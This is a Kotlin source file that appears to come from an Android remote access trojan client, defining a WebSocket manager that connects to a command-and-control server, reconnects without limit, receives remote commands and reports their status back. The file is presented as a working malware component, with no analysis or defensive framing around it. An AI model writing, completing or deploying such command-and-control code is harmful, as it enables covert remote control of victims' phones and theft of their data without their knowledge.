package com.rat.client.utils

import android.util.Log
import com.rat.client.Config
import io.socket.client.IO
import io.socket.client.Socket
import io.socket.emitter.Emitter
import org.json.JSONArray
import org.json.JSONObject

/**
 * WebSocket manager for real-time command delivery.
 * 
 * Replaces HTTP polling with instant push from the C2 server.
 * Falls back to HTTP if the socket disconnects.
 */
object SocketManager {
    private const val TAG = "SocketManager"
    private var socket: Socket? = null
    private var commandListener: CommandListener? = null
    private var connected = false

    interface CommandListener {
        fun onCommandsReceived(commands: List<CommandData>)
        fun onConnectionStateChanged(connected: Boolean)
    }

    data class CommandData(
        val id: String,
        val type: String,
        val params: JSONObject
    )

    /**
     * Connect to the C2 server via WebSocket.
     * @param deviceId The device's unique identifier
     * @param listener Callback for incoming commands
     */
    fun connect(deviceId: String, listener: CommandListener) {
        this.commandListener = listener

        try {
            val options = IO.Options().apply {
                auth = mapOf("deviceId" to deviceId)
                reconnection = true
                reconnectionAttempts = Int.MAX_VALUE
                reconnectionDelay = 5000
                reconnectionDelayMax = 30000
                timeout = 15000
                transports = arrayOf("websocket", "polling")
            }

            socket = IO.socket(Config.SERVER_URL, options)

            socket?.on(Socket.EVENT_CONNECT) {
                connected = true
                Log.d(TAG, "Socket connected")
                listener.onConnectionStateChanged(true)
                // Send heartbeat on reconnect so server re-registers this socket
                sendHeartbeat(deviceId)
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                connected = false
                Log.w(TAG, "Socket disconnected — auto-reconnecting...")
                listener.onConnectionStateChanged(false)
            }

            socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
                Log.e(TAG, "Socket connect error: ${args.firstOrNull()} — will retry")
            }

            // io.socket doesn't export constants for reconnect events — use raw strings
            socket?.on("reconnect") { _ ->
                connected = true
                Log.d(TAG, "Socket reconnected")
                listener.onConnectionStateChanged(true)
                sendHeartbeat(deviceId)
            }

            socket?.on("reconnect_attempt") {
                Log.d(TAG, "Socket reconnect attempt")
            }

            // New single command
            socket?.on("command:new", Emitter.Listener { args ->
                if (args.isNotEmpty()) {
                    try {
                        val data = JSONObject(args[0].toString())
                        val cmd = CommandData(
                            id = data.optString("id"),
                            type = data.optString("type"),
                            params = data.optJSONObject("params") ?: JSONObject()
                        )
                        Log.d(TAG, "Received command via socket: ${cmd.type} (${cmd.id})")
                        listener.onCommandsReceived(listOf(cmd))
                    } catch (e: Exception) {
                        Log.e(TAG, "Parse command:new error: ${e.message}")
                    }
                }
            })

            // Batch pending commands (sent on connect/heartbeat)
            socket?.on("commands:pending", Emitter.Listener { args ->
                if (args.isNotEmpty()) {
                    try {
                        val arr = JSONArray(args[0].toString())
                        val commands = mutableListOf<CommandData>()
                        for (i in 0 until arr.length()) {
                            val obj = arr.getJSONObject(i)
                            commands.add(CommandData(
                                id = obj.optString("id"),
                                type = obj.optString("type"),
                                params = obj.optJSONObject("params") ?: JSONObject()
                            ))
                        }
                        Log.d(TAG, "Received ${commands.size} pending commands via socket")
                        listener.onCommandsReceived(commands)
                    } catch (e: Exception) {
                        Log.e(TAG, "Parse commands:pending error: ${e.message}")
                    }
                }
            })

            socket?.connect()
        } catch (e: Exception) {
            Log.e(TAG, "Socket init error: ${e.message}")
        }
    }

    /**
     * Send command status update to server via socket.
     */
    fun sendCommandStatus(commandId: String, status: String) {
        if (!connected) return
        try {
            val data = JSONObject().apply {
                put("commandId", commandId)
                put("status", status)
            }
            socket?.emit("command:status", data)
        } catch (e: Exception) {
            Log.e(TAG, "Status emit error: ${e.message}")
        }
    }

    /**
     * Send heartbeat via socket.
     */
    fun sendHeartbeat(deviceId: String) {
        if (!connected) return
        try {
            val data = JSONObject().apply {
                put("deviceId", deviceId)
            }
            socket?.emit("device:heartbeat", data)
        } catch (e: Exception) {
            Log.e(TAG, "Heartbeat emit error: ${e.message}")
        }
    }

    fun isConnected(): Boolean = connected

    fun disconnect() {
        socket?.disconnect()
        socket?.off()
        socket = null
        connected = false
    }
}